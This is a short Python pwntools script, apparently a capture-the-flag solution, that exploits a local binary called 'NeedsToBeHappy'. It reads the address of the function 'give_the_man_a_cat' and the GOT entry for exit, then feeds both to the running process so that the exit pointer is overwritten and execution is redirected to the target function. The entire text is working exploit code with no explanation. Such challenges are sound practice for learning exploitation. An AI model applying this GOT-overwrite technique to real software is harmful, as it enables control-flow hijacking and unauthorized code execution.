from pwn import *


elf = ELF("./NeedsToBeHappy")

target_address = elf.symbols['give_the_man_a_cat']

end_address = elf.got['exit']

p = process('./NeedsToBeHappy')

p.sendline("y")
p.sendline(str(target_address).encode('ascii'))
p.sendline(str(end_address).encode('ascii'))
